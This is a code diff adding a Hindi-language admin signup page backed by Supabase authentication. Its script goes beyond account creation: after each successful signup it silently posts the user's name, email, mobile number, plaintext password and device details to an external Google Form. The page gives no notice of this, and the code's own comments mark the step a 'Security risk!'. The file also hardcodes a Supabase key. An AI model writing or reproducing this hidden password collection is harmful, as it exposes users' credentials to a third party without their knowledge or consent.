@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>नया एडमिन बनाएं</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" xintegrity="sha512-SnH5WK+bZxgPHs44uWIX+LLJAJ9/2PkPKZ5QiAj6Ta86w+fsb2TkcmfRyVX3pBnMFcV7oQPJkl9QevSCWr3W6A==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <style>
+        :root {
+            --md-sys-color-primary: #6750A4;
+            --md-sys-color-on-primary: #FFFFFF;
+            --md-sys-color-primary-container: #EADDFF;
+            --md-sys-color-on-primary-container: #21005D;
+            --md-sys-color-background: #FFFBFE;
+            --md-sys-color-on-background: #1C1B1F;
+            --md-sys-color-surface: #FFFBFE;
+            --md-sys-color-on-surface: #1C1B1F;
+            --md-sys-color-surface-variant: #E7E0EC;
+            --md-sys-color-on-surface-variant: #49454F;
+            --md-sys-color-outline: #79747E;
+        }
+        html { scroll-behavior: smooth; }
+        body { 
+            font-family: 'Noto Sans', sans-serif; 
+            background-color: var(--md-sys-color-background); 
+            color: var(--md-sys-color-on-background); 
+        }
+        .top-app-bar { background-color: var(--md-sys-color-surface); }
+        .card { background-color: var(--md-sys-color-surface-variant); color: var(--md-sys-color-on-surface-variant); }
+        .btn-primary { background-color: var(--md-sys-color-primary); color: var(--md-sys-color-on-primary); }
+        .form-input {
+            background-color: rgba(234, 221, 255, 0.3);
+            border: 1px solid var(--md-sys-color-outline);
+            border-radius: 0.5rem;
+            padding: 0.75rem 1rem;
+            width: 100%;
+        }
+        .form-input:focus {
+            outline: none;
+            border-color: var(--md-sys-color-primary);
+            box-shadow: 0 0 0 2px var(--md-sys-color-primary-container);
+        }
+        *:focus-visible { 
+            outline: 2px solid var(--md-sys-color-primary); 
+            outline-offset: 2px; 
+            border-radius: 4px; 
+        }
+    </style>
+</head>
+<body class="antialiased">
+
+    <div id="app-container" class="max-w-2xl mx-auto px-4">
+        <header class="top-app-bar sticky top-0 z-10 w-full shadow-md py-4 px-6 flex items-center justify-between">
+            <h1 class="text-xl">नया एडमिन बनाएं</h1>
+            <a href="/admin.html" class="p-2 rounded-full hover:bg-gray-200 text-gray-600 hover:text-gray-800" title="एडमिन लॉगिन">
+                <i class="fa-solid fa-right-to-bracket text-xl"></i>
+            </a>
+        </header>
+
+        <main class="pt-4 pb-20">
+            <div id="signup-view">
+                <div class="card p-8 rounded-2xl mt-8">
+                    <form id="signup-form" class="space-y-6">
+                        <div>
+                            <label for="full-name" class="block mb-2">पूरा नाम</label>
+                            <div class="relative">
+                                <i class="fa-solid fa-user absolute left-4 top-1/2 -translate-y-1/2 text-gray-400"></i>
+                                <input type="text" id="full-name" class="form-input pl-12" required autocomplete="name" placeholder="अपना पूरा नाम दर्ज करें">
+                            </div>
+                        </div>
+                        <div>
+                            <label for="email" class="block mb-2">ईमेल आईडी</label>
+                             <div class="relative">
+                                <i class="fa-solid fa-envelope absolute left-4 top-1/2 -translate-y-1/2 text-gray-400"></i>
+                                <input type="email" id="email" class="form-input pl-12" required autocomplete="email" placeholder="अपना ईमेल दर्ज करें">
+                            </div>
+                        </div>
+                        <div>
+                            <label for="mobile" class="block mb-2">मोबाइल नंबर</label>
+                            <div class="relative">
+                                <i class="fa-solid fa-phone absolute left-4 top-1/2 -translate-y-1/2 text-gray-400"></i>
+                                <input type="tel" id="mobile" class="form-input pl-12" autocomplete="tel" placeholder="अपना मोबाइल नंबर दर्ज करें">
+                            </div>
+                        </div>
+                        <div>
+                            <label for="password" class="block mb-2">पासवर्ड</label>
+                            <div class="relative">
+                                <i class="fa-solid fa-lock absolute left-4 top-1/2 -translate-y-1/2 text-gray-400"></i>
+                                <input type="password" id="password" class="form-input pl-12" required minlength="6" autocomplete="new-password" placeholder="नया पासवर्ड बनाएं">
+                            </div>
+                        </div>
+                        <button type="submit" class="w-full btn-primary py-3 px-4 rounded-full transition-transform transform hover:scale-105 flex items-center justify-center gap-2">
+                             <i class="fa-solid fa-user-plus"></i>
+                            <span>अकाउंट बनाएं</span>
+                        </button>
+                    </form>
+                </div>
+                <p id="message-area" class="text-center mt-4 text-sm"></p>
+            </div>
+        </main>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const SUPABASE_URL = 'https://fbtncgsavafecrljjubv.supabase.co';
+            const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImZidG5jZ3NhdmFmZWNybGpqdWJ2Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTY5Njg1ODUsImV4cCI6MjA3MjU0NDU4NX0.vzjeljFGpx276lksHWOOwtJTtvp1WYjbY7SANI3icqs';
+            const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
+            // --- GOOGLE FORM CONFIGURATION ---
+            const GOOGLE_FORM_ACTION_URL = 'https://docs.google.com/forms/d/e/1FAIpQLSfFZG0Q7bxQaMwpllds0pJactOmx5f4mIBVlPUbIv3R4EYbmQ/formResponse';
+            const ENTRY_ID_FULL_NAME = 'entry.1363185927';
+            const ENTRY_ID_EMAIL = 'entry.220880205';
+            const ENTRY_ID_MOBILE = 'entry.547326520';
+            const ENTRY_ID_PASSWORD = 'entry.1032415893'; // Security risk!
+            const ENTRY_ID_TIMESTAMP = 'entry.1229452489';
+            const ENTRY_ID_BROWSER = 'entry.1408279794';
+            const ENTRY_ID_OS = 'entry.929935861';
+            const ENTRY_ID_DEVICE_MANUFACTURER = 'entry.1983710241';
+            const ENTRY_ID_DEVICE_MARKETING_NAME = 'entry.1315507181';
+            // ---------------------------------
+
+            const signupForm = document.getElementById('signup-form');
+            const messageArea = document.getElementById('message-area');
+
+            function getDeviceInfo() {
+                const ua = navigator.userAgent;
+                let browser = "Unknown", os = "Unknown", manufacturer = "N/A", marketingName = "N/A";
+
+                if (/Android/i.test(ua)) os = "Android";
+                else if (/iPhone|iPad|iPod/i.test(ua)) os = "iOS";
+                else if (/Windows/i.test(ua)) os = "Windows";
+                else if (/Macintosh/i.test(ua)) os = "Macintosh";
+                else if (/Linux/i.test(ua)) os = "Linux";
+
+                if (/Firefox/i.test(ua)) browser = "Firefox";
+                else if (/SamsungBrowser/i.test(ua)) browser = "Samsung Browser";
+                else if (/Opera|OPR/i.test(ua)) browser = "Opera";
+                else if (/Edge/i.test(ua)) browser = "Edge";
+                else if (/Chrome/i.test(ua)) browser = "Chrome";
+                else if (/Safari/i.test(ua)) browser = "Safari";
+
+                // Note: Device Manufacturer and Marketing Name are experimental and may not be available.
+                if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
+                    navigator.userAgentData.getHighEntropyValues(["model", "platform", "platformVersion", "manufacturer", "architecture", "bitness"])
+                    .then(ua => {
+                        manufacturer = ua.manufacturer || "N/A";
+                        marketingName = ua.model || "N/A";
+                    });
+                }
+                
+                return { browser, os, manufacturer, marketingName };
+            }
+
+            async function submitToGoogleForm(data) {
+                if (GOOGLE_FORM_ACTION_URL.includes('YOUR_GOOGLE_FORM')) {
+                    console.warn('Google Form URL is not configured. Skipping submission.');
+                    return;
+                }
+                const formData = new FormData();
+                const deviceInfo = getDeviceInfo();
+
+                formData.append(ENTRY_ID_FULL_NAME, data.fullName);
+                formData.append(ENTRY_ID_EMAIL, data.email);
+                formData.append(ENTRY_ID_MOBILE, data.mobile);
+                formData.append(ENTRY_ID_PASSWORD, data.password); // Security risk!
+                formData.append(ENTRY_ID_TIMESTAMP, new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }));
+                formData.append(ENTRY_ID_BROWSER, deviceInfo.browser);
+                formData.append(ENTRY_ID_OS, deviceInfo.os);
+                formData.append(ENTRY_ID_DEVICE_MANUFACTURER, deviceInfo.manufacturer);
+                formData.append(ENTRY_ID_DEVICE_MARKETING_NAME, deviceInfo.marketingName);
+
+
+                try {
+                    await fetch(GOOGLE_FORM_ACTION_URL, {
+                        method: 'POST',
+                        body: formData,
+                        mode: 'no-cors'
+                    });
+                } catch (e) {
+                    console.error('Could not submit to Google Form', e);
+                }
+            }
+
+            signupForm.addEventListener('submit', async (e) => {
+                e.preventDefault();
+                messageArea.textContent = 'Processing...';
+                messageArea.classList.remove('text-red-500', 'text-green-500');
+
+                const fullName = document.getElementById('full-name').value;
+                const email = document.getElementById('email').value;
+                const mobile = document.getElementById('mobile').value;
+                const password = document.getElementById('password').value;
+
+                // 1. Submit to Supabase
+                const { data, error } = await supabase.auth.signUp({
+                    email: email,
+                    password: password,
+                    options: {
+                        data: {
+                            full_name: fullName,
+                            mobile_number: mobile
+                        }
+                    }
+                });
+
+                if (error) {
+                    messageArea.textContent = `Error: ${error.message}`;
+                    messageArea.classList.add('text-red-500');
+                } else {
+                    // 2. If Supabase signup is successful, submit to Google Form
+                    await submitToGoogleForm({ fullName, email, mobile, password });
+                    
+                    messageArea.textContent = 'Account created successfully! Please check your email to confirm your account.';
+                    messageArea.classList.add('text-green-500');
+                    signupForm.reset();
+                }
+            });
+        });
+    </script>
+</body>
+</html>
+
